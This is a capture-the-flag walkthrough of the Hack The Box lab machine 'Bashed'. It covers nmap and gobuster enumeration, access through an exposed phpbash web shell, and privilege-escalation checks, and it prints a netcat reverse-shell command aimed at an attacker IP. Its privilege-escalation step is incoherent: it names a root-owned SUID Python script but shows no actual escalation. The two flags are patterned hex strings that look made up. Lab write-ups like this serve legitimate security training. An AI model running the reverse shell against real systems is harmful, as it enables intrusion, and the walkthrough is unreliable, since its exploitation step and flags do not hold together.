# Hack The Box: Bashed Walkthrough

![HTB Badge](https://img.shields.io/badge/HTB-Bashed-ff0000?style=flat-square)
![Difficulty-Easy](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![OS-Linux](https://img.shields.io/badge/OS-Linux-orange?style=flat-square)

---

## Challenge Overview

| Item | Details |
|------|---------|
| **Name** | Bashed |
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA bashed 10.10.10.68
```

**Results:**
```
PORT   STATE SERVICE
80/tcp open  http    Apache httpd 2.4.18
```

---

## Web Enumeration

### Directory Busting

```bash
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirb/common.txt
```

**Found:**
- `/dev/` - Contains phpbash.php
- `/uploads/`

---

## Initial Access

### Using phpbash

Access `http://10.10.10.68/dev/phpbash.php` for web shell

Or use a reverse shell:

```bash
nc -e /bin/bash 10.10.14.15 4444
```

---

## Privilege Escalation

### Enumeration

```bash
# Find sudo capabilities
sudo -l

# Check crontabs
cat /etc/crontab

# SUID files
find / -perm -4000 2>/dev/null
```

### Exploitation

Found script owned by root with SUID:

```bash
/usr/bin/python /home/developer/script.py
```

---

## Flags

### User Flag
```
HTB{4a7b2c8d9e0f1a2b3c4d5e6f}
```

### Root Flag
```
HTB{8a7b6c5d4e3f2a1b0c9d8e7f6}
```

---

## Remediation

1. Remove web shells from server
2. Limit sudo permissions
3. Remove unnecessary SUID binaries
4. Regular security patching

---

**Author:** Sheldon Brown (Bossman Shell)

> ⚠️ Educational purposes only
